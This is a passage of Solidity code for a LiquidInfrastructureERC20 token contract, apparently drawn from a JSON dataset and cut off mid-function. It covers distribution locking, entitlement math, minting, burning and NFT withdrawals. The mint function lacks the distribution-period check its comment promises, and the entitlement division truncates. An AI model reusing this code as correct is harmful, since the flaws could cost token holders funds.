function _isPastMinDistributionPeriod() internal view returns (bool) {\n        // Do not force a distribution with no holders or supply\n        if (totalSupply() == 0 || holders.length == 0) {\n            return false;\n        }\n\n        return (block.number - LastDistribution) >= MinDistributionPeriod;\n    }\n\n    /**\n     * Prepares this contract for distribution:\n     * - Locks the contract\n     * - Calculates the entitlement to protocol-held ERC20s per unit of the LiquidInfrastructureERC20 held\n     */\n    function _beginDistribution() internal {\n        require(\n            !LockedForDistribution,\n            \"cannot begin distribution when already locked\"\n        );\n        LockedForDistribution = true;\n\n        // clear the previous entitlements, if any\n        if (erc20EntitlementPerUnit.length > 0) {\n            delete erc20EntitlementPerUnit;\n        }\n\n        // Calculate the entitlement per token held\n        uint256 supply = this.totalSupply();\n        for (uint i = 0; i < distributableERC20s.length; i++) {\n            uint256 balance = IERC20(distributableERC20s[i]).balanceOf(\n                address(this)\n            );\n            uint256 entitlement = balance / supply;\n            erc20EntitlementPerUnit.push(entitlement);\n        }\n\n        nextDistributionRecipient = 0;\n        emit DistributionStarted();\n    }\n\n    /**\n     * Unlocks this contract at the end of a distribution\n     */\n    function _endDistribution() internal {\n        require(\n            LockedForDistribution,\n            \"cannot end distribution when not locked\"\n        );\n        delete erc20EntitlementPerUnit;\n        LockedForDistribution = false;\n        LastDistribution = block.number;\n        emit DistributionFinished();\n    }\n\n    /**\n     * Convenience function that allows the contract owner to distribute when necessary and then mint right after\n     *\n     * @notice attempts to distribute to every holder in this block, which may exceed the block gas limit\n     * if this fails then first call distribute\n     */\n    function mintAndDistribute(\n        address account,\n        uint256 amount\n    ) public onlyOwner {\n        if (_isPastMinDistributionPeriod()) {\n            distributeToAllHolders();\n        }\n        mint(account, amount);\n    }\n\n    /**\n     * Allows the contract owner to mint tokens for an address\n     *\n     * @notice minting may only occur when a distribution has happened within MinDistributionPeriod blocks\n     */\n    function mint(\n        address account,\n        uint256 amount\n    ) public onlyOwner nonReentrant {\n        _mint(account, amount);\n    }\n\n    /**\n     * Convenience function that allows a token holder to distribute when necessary and then burn their tokens right after\n     *\n     * @notice attempts to distribute to every holder in this block, which may exceed the block gas limit\n     * if this fails then first call distribute() enough times to finish a distribution and then call burn()\n     */\n    function burnAndDistribute(uint256 amount) public {\n        if (_isPastMinDistributionPeriod()) {\n            distributeToAllHolders();\n        }\n        burn(amount);\n    }\n\n    /**\n     * Convenience function that allows an approved sender to distribute when necessary and then burn the approved tokens right after\n     *\n     * @notice attempts to distribute to every holder in this block, which may exceed the block gas limit\n     * if this fails then first call distribute() enough times to finish a distribution and then call burnFrom()\n     */\n    function burnFromAndDistribute(address account, uint256 amount) public {\n        if (_isPastMinDistributionPeriod()) {\n            distributeToAllHolders();\n        }\n        burnFrom(account, amount);\n    }\n\n    function withdrawFromAllManagedNFTs() public {\n        withdrawFromManagedNFTs(ManagedNFTs.length);\n    }\n\n    /**\n     * Performs withdrawals from the ManagedNFTs collection, depositing all token balances into the custody of this contract\n     * @param numWithdrawals the number of withdrawals to perform\n     */\n    function withdrawFromManagedNFTs(uint256 numWithdrawals) public {\n        require(!LockedForDistribution, \"cannot withdraw during distribution\");\n\n        if (nextWithdrawal == 0) {\n            emit WithdrawalStarted();\n        }\n\n        uint256 limit = Math.min(\n            numWithdrawals + nextWithdrawal,\n            ManagedNFTs.length\n        );\n        uint256 i;\n        for (i = nextWithdrawal; i < limit; i++) {\n            LiquidInfrastructureNFT withdrawFrom = LiquidInfrastructureNFT(\n                ManagedNFTs[i]\n            );\n\n            (address[] memory withdrawERC20s, ) = withdrawFrom.getThresholds();\n            withdrawFrom.withdrawBalancesTo(withdrawERC20s, address(this));\n            emit Withdrawal(address(withdrawFrom));\n        }\n        nextWithdrawal = i;\n\n        if (nextWithdrawal == ManagedNFTs.length) {\n            nextWithdrawal = 0;\n            emit WithdrawalFinished();\n        }\n    }\n\n    /**\n     * Adds a LiquidInfrastructureNFT contract to the ManagedNFTs collection\n     * @notice this contract must already be the owner of the `nftContract` before this function is called\n     *\n     * @param nftContract the LiquidInfrastructureNFT contract to add to ManagedNFTs\n     */\n    function addManagedNFT(address nftContract) public onlyOwner {\n        LiquidInfrastructureNFT nft = LiquidInfrastructureNFT(nftContract);\n        address nftOwner = nft.ownerOf(nft.AccountId());\n        require(\n            nftOwner == address(this),\n            \"this contract does not own the new ManagedNFT\"\n        );\n        ManagedNFTs.push(nftContract);\n        emit AddManagedNFT(nftContract);\n    }\n\n    /**\n     * Transfers a LiquidInfrastructureNFT contract out of the control of this contract\n     * @notice LiquidInfrastructureNFTs only hold a single token with a specific id (AccountId), this function\n     * only transfers the token with that specific id\n     *\n     * @param nftContract the NFT to release\n     * @param to the new owner of the NFT\n     */\n    function releaseManagedNFT(\n        address nftContract,\n        addr"
    }
  ]
}